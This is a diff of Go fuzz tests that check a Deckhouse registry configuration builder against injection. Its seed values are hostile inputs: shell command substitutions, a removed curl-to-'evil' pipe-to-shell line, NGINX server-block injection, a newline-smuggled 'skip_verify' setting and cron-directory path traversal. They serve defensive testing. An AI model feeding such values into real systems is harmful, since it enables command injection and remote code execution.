@@ -48,35 +48,30 @@ import (
 	"github.com/deckhouse/deckhouse/go_lib/registry/models/bashible"
 )
 
-// hostileAddresses are the values a node address must not be able to carry into
-// the generated NGINX configuration or the containerd registry directory.
-var hostileAddresses = []string{
-	"10.0.0.1",
-	"",
-	"fd00::1",
-	"10.0.0.1; return 200",
-	"10.0.0.1;}\nserver { listen 127.0.0.1:5002; proxy_pass evil; }",
-	"10.0.0.1 # comment",
-	"$(id > /tmp/pwned)",
-	"`id`",
-	"${IFS}",
-	"10.0.0.1$(curl http://evil/x|sh)",
-	"../../../etc/cron.d/x",
-	"evil.example.com",
-	"10.0.0.1:5001",
-	"999.999.999.999",
-	"\x00",
-	"\\",
-}
-
 func FuzzConfigBuilderMasterNodesIPs(f *testing.F) {
-	for _, address := range hostileAddresses {
-		f.Add(address, false)
-		f.Add(address, true)
-	}
+	// The master addresses as k8s.go collects them, then the values a Node
+	// object could carry instead. The bool picks Local over Proxy: both modes
+	// produce endpoints, and the placeholder path differs between them.
+	f.Add("10.0.0.1", false)
+	f.Add("10.0.0.1", true)
 	f.Add("10.0.0.1,10.0.0.2,10.0.0.3", false)
-	f.Add("10.0.0.1,$(id)", false)
+	f.Add("10.0.0.1,10.0.0.2,10.0.0.3", true)
+	f.Add("", false)
 	f.Add(",", false)
+	f.Add(",,", true)
+	f.Add("10.0.0.1,", false)
+	f.Add("fd00::1", false)
+	f.Add("[fd00::1]", true)
+	f.Add("10.0.0.1:5001", false)
+	f.Add("10.0.0.1; return 200", false)
+	f.Add("10.0.0.1;}\nserver { listen 127.0.0.1:5002; proxy_pass evil; }", false)
+	f.Add("10.0.0.1 # comment", true)
+	f.Add("$(id > /tmp/pwned)", false)
+	f.Add("`id`", true)
+	f.Add("${IFS}", false)
+	f.Add("../../../etc/cron.d/x", false)
+	f.Add("999.999.999.999", true)
+	f.Add("\x00", false)
 
 	f.Fuzz(func(t *testing.T, joined string, useLocal bool) {
 		if len(joined) > 4096 {
@@ -109,28 +104,29 @@ func FuzzConfigBuilderMasterNodesIPs(f *testing.F) {
 // reads from the deckhouse-registry secret rather than from the ModuleConfig,
 // so they do not pass the ModuleConfig validation on the way in.
 func FuzzConfigBuilderUnmanaged(f *testing.F) {
-	seeds := []string{
-		"registry.example.com/deckhouse/ee",
-		"registry.example.com:5000/deckhouse/ee",
-		"",
-		"registry.example.com",
-		"registry.example.com/",
-		"registry.example.com/a/../../b",
-		"registry.example.com; return 200",
-		"registry.example.com$(id)",
-		"`id`/x",
-		"registry.example.com\nserver 127.0.0.1:5002",
-		"../../../etc/cron.d/x",
-		"[fd00::1]:5000/x",
-		"registry.example.com/deckhouse/ee:tag",
-	}
-
-	for _, repo := range seeds {
-		f.Add(repo, "https")
-		f.Add(repo, "http")
-		f.Add(repo, "HTTPS")
-		f.Add(repo, "")
-	}
+	// The Unmanaged parameters as fromRegistrySecret builds them from the
+	// deckhouse-registry secret: the address and the scheme, neither validated
+	// on the way in. The scheme is lowercased there, so its casing is varied too.
+	f.Add("registry.example.com/deckhouse/ee", "https")
+	f.Add("registry.example.com:5000/deckhouse/ee", "https")
+	f.Add("registry.example.com/deckhouse/ee", "http")
+	f.Add("registry.example.com/deckhouse/ee", "HTTPS")
+	f.Add("registry.example.com/deckhouse/ee", "")
+	f.Add("registry.example.com/deckhouse/ee", "ftp")
+	f.Add("registry.example.com", "https")
+	f.Add("registry.example.com/", "https")
+	f.Add("", "https")
+	f.Add("/", "https")
+	f.Add("registry.example.com/a/../../b", "https")
+	f.Add("../../../etc/cron.d/x", "https")
+	f.Add("registry.example.com; return 200", "https")
+	f.Add("registry.example.com$(id)", "https")
+	f.Add("`id`/x", "https")
+	f.Add("registry.example.com\nserver 127.0.0.1:5002", "https")
+	f.Add("[fd00::1]:5000/x", "https")
+	f.Add("registry.example.com:99999/x", "https")
+	f.Add("registry.example.com/deckhouse/ee:tag", "https")
+	f.Add("registry.example.com/deckhouse/ee", "https\nskip_verify = true")
 
 	f.Fuzz(func(t *testing.T, imagesRepo, scheme string) {
 		if len(imagesRepo) > 4096 || len(scheme) > 64 {
